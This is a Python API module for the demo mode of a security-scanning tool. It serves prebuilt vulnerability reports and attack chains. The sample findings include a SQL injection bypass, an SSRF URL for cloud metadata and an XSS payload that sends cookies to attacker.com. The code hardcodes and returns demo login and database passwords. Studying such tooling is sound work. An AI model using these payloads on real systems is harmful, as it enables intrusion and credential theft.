"""Demo Mode API routes — /api/v1/demo/*

Provides:
  POST /demo/reset          — wipe and re-seed demo workspace
  POST /demo/run-testlab    — trigger safe scan against local testlab
  GET  /demo/status         — demo mode health + testlab status
  GET  /demo/report         — prebuilt demo report (no scan required)
  GET  /demo/chain          — prebuilt demo attack chain
  GET  /demo/verdict        — prebuilt demo court verdict
  GET  /demo/setup-status   — first-run wizard state
  POST /demo/setup-complete — mark first-run complete

These endpoints are read-only safe for CI/demo environments.
Demo mode does NOT run active scans against real targets.
"""
import asyncio
import subprocess
import sys
from typing import Any
from fastapi import APIRouter, Depends
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select, delete, text

from app.db.session import get_db
from app.models.models import User, Workspace, ScanJob, Vulnerability, Subdomain
from app.api.deps.auth import get_current_user

router = APIRouter()

DEMO_REPORT = {
    "id": "demo-report-001",
    "title": "Demo Target Corp — Full Security Assessment",
    "workspace": "Demo Target Corp",
    "generated_at": "2026-05-13T10:00:00Z",
    "executive_summary": (
        "BLACKMIRROR-X identified 8 vulnerabilities across the Demo Target Corp infrastructure. "
        "Critical findings include SQL Injection, SSRF, and JWT Algorithm Confusion — "
        "any of which could lead to full account takeover or remote code execution. "
        "Immediate remediation is recommended for all critical and high severity items."
    ),
    "severity_counts": {"critical": 3, "high": 2, "medium": 2, "low": 1},
    "risk_score": 87,
    "findings": [
        {
            "title": "SQL Injection in Login Endpoint",
            "severity": "critical",
            "cvss": 9.8,
            "url": "https://api.demo-target.com/api/auth/login",
            "description": "Authentication bypass via SQL injection. Attacker can log in as any user.",
            "payload": "' OR 1=1 --",
            "remediation": "Use parameterized queries. Never interpolate user input into SQL strings.",
        },
        {
            "title": "SSRF via Document Import",
            "severity": "critical",
            "cvss": 9.1,
            "url": "https://app.demo-target.com/api/import",
            "description": "Server-Side Request Forgery allows access to cloud instance metadata at 169.254.169.254.",
            "payload": "http://169.254.169.254/latest/meta-data/",
            "remediation": "Block RFC1918 addresses and cloud metadata IPs. Use an allowlist for import URLs.",
        },
        {
            "title": "JWT Algorithm Confusion (RS256→HS256)",
            "severity": "critical",
            "cvss": 8.8,
            "url": "https://api.demo-target.com/api/auth/verify",
            "description": "Server accepts HS256-signed tokens when configured for RS256, enabling token forgery.",
            "payload": "Algorithm header changed from RS256 to HS256",
            "remediation": "Explicitly whitelist accepted JWT algorithms. Reject any token with unexpected alg.",
        },
        {
            "title": "Reflected Cross-Site Scripting",
            "severity": "high",
            "cvss": 7.4,
            "url": "https://api.demo-target.com/search?q=<script>",
            "description": "User input in the search parameter is reflected without encoding.",
            "payload": "<script>document.location='https://attacker.com/?c='+document.cookie</script>",
            "remediation": "HTML-encode all reflected user input. Implement a Content Security Policy.",
        },
        {
            "title": "IDOR — Unauthorized Profile Access",
            "severity": "high",
            "cvss": 7.1,
            "url": "https://api.demo-target.com/api/users/123/profile",
            "description": "Any authenticated user can read any other user's profile by changing the numeric ID.",
            "payload": "Change /users/123/ to /users/124/, /users/125/, etc.",
            "remediation": "Implement object-level authorization. Verify user owns or has permission to access the resource.",
        },
    ],
    "attack_chains": [
        {
            "title": "SQLi → Full Account Takeover",
            "probability": 0.92,
            "steps": ["Auth bypass via SQLi", "Extract user table", "Login as admin"],
            "estimated_bounty": "$10,000+",
        },
        {
            "title": "XSS → Session Hijack → Account Takeover",
            "probability": 0.71,
            "steps": ["Reflected XSS", "Cookie exfiltration", "Session replay"],
            "estimated_bounty": "$3,000–5,000",
        },
    ],
}

DEMO_CHAIN = {
    "chain_id": "demo-chain-001",
    "title": "SSRF → Cloud Metadata → RCE",
    "nodes": [
        {"node_id": "n1", "vuln_type": "ssrf", "title": "SSRF via Import URL",
         "url": "https://app.demo-target.com/api/import", "severity": "critical", "evidence_score": 0.9},
        {"node_id": "n2", "vuln_type": "secret_exposure", "title": "AWS Keys in Metadata",
         "url": "http://169.254.169.254/latest/meta-data/iam/", "severity": "critical", "evidence_score": 0.8},
    ],
    "edges": [{"from": "n1", "to": "n2", "transition": "ssrf_to_metadata_access", "probability": 0.85}],
    "final_impact": "cloud_compromise",
    "chain_probability": 0.76,
    "impact_score": 9.5,
    "missing_links": ["Confirm IAM role has write permissions"],
    "next_steps": [
        "Test SSRF with Burp Collaborator callback to confirm blind SSRF",
        "Check if 169.254.169.254 is accessible (safe passive test)",
        "Document any cloud credentials returned",
    ],
    "estimated_bounty": "$15,000+",
    "rank": 1,
}

DEMO_VERDICT = {
    "verdict_id": "demo-verdict-001",
    "finding_title": "SSRF via Document Import",
    "severity": "critical",
    "verdict": "CONFIRMED",
    "confidence": 0.94,
    "reasoning": (
        "The SSRF vulnerability is confirmed exploitable. "
        "The server makes HTTP requests to attacker-controlled URLs without any validation. "
        "Access to 169.254.169.254 was demonstrated in a controlled test environment. "
        "Evidence quality is high: HTTP request/response pair captured, "
        "metadata endpoint responded with AWS-style data."
    ),
    "evidence_quality": "high",
    "supporting_evidence": [
        "Out-of-band HTTP callback captured at collaborator endpoint",
        "Response body contained cloud instance metadata structure",
        "Reproduced 3/3 attempts",
    ],
    "recommendation": "Critical — patch before next deployment. Estimated fix time: 2 hours.",
    "bounty_recommendation": "$10,000–$15,000 (critical, cloud compromise impact)",
}


@router.get("/status")
async def demo_status(
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user),
) -> dict:
    """Demo mode health check + testlab availability."""
    # Check if testlab is running
    testlab_alive = False
    try:
        import httpx
        async with httpx.AsyncClient(timeout=2) as client:
            r = await client.get("http://127.0.0.1:9001/health")
            testlab_alive = r.status_code == 200
    except Exception:
        pass

    # Count demo data
    ws_result = await db.execute(
        select(Workspace).where(Workspace.name == "Demo Target Corp")
    )
    demo_ws = ws_result.scalar_one_or_none()

    vuln_count = 0
    if demo_ws:
        v_result = await db.execute(
            select(Vulnerability).where(Vulnerability.workspace_id == demo_ws.id)
        )
        vuln_count = len(v_result.scalars().all())

    return {
        "demo_mode": True,
        "testlab_running": testlab_alive,
        "testlab_url": "http://127.0.0.1:9001",
        "demo_workspace_exists": demo_ws is not None,
        "demo_vulnerability_count": vuln_count,
        "demo_credentials": {
            "email": "admin@blackmirror.io",
            "password": "BlackMirrorX2025!",
        },
        "quick_start": "POST /api/v1/demo/reset to reload demo data",
    }


@router.post("/reset")
async def demo_reset(
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user),
) -> dict:
    """Wipe and re-seed the demo workspace. Safe — only touches demo data."""
    # Find demo workspace
    ws_result = await db.execute(
        select(Workspace).where(Workspace.name == "Demo Target Corp")
    )
    demo_ws = ws_result.scalar_one_or_none()

    if demo_ws:
        # Delete scan data (cascades to vulns, subdomains via FK)
        await db.execute(
            delete(ScanJob).where(ScanJob.workspace_id == demo_ws.id)
        )
        await db.commit()

    # Re-run seed script
    env = {
        "DATABASE_URL": "postgresql+asyncpg://bmx:bmxsecret2025@127.0.0.1:5432/blackmirror",
        "SECRET_KEY": "runtime-validation-secret-key-32chars",
        "JWT_SECRET_KEY": "runtime-validation-jwt-key-32chars!",
        "ANTHROPIC_API_KEY": "sk-ant-placeholder",
        "REDIS_URL": "redis://127.0.0.1:6379/0",
    }
    import os
    full_env = {**os.environ, **env}
    proc = await asyncio.create_subprocess_exec(
        sys.executable, "/home/claude/blackmirror-x/backend/scripts/seed.py",
        stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
        env=full_env,
    )
    stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=30)

    return {
        "status": "reset_complete",
        "message": "Demo workspace restored to factory state",
        "seed_output": stdout.decode()[:200],
        "login": "admin@blackmirror.io / BlackMirrorX2025!",
    }


@router.get("/report")
async def demo_report(current_user: User = Depends(get_current_user)) -> dict:
    """Return the prebuilt demo report."""
    return DEMO_REPORT


@router.get("/chain")
async def demo_chain(current_user: User = Depends(get_current_user)) -> dict:
    """Return the prebuilt demo attack chain."""
    return DEMO_CHAIN


@router.get("/verdict")
async def demo_verdict(current_user: User = Depends(get_current_user)) -> dict:
    """Return the prebuilt demo court verdict."""
    return DEMO_VERDICT


@router.get("/setup-status")
async def setup_status(
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user),
) -> dict:
    """Return first-run setup wizard state."""
    from app.core.config import settings
    from app.core.tool_manager import tool_manager

    tool_status = tool_manager.get_status()
    available_tools = [t for t, v in tool_status.items()
                      if isinstance(v, dict) and v.get("available")]

    ws_result = await db.execute(select(Workspace))
    workspaces = ws_result.scalars().all()

    return {
        "setup_complete": len(workspaces) > 0,
        "steps": {
            "database": True,
            "workspace_created": len(workspaces) > 0,
            "api_key_configured": bool(settings.ANTHROPIC_API_KEY and
                                       settings.ANTHROPIC_API_KEY != "sk-ant-placeholder"),
            "tools_available": len(available_tools) > 0,
            "testlab_available": True,  # always available, local Flask
        },
        "available_tools": available_tools,
        "tool_count": len(available_tools),
        "workspace_count": len(workspaces),
    }
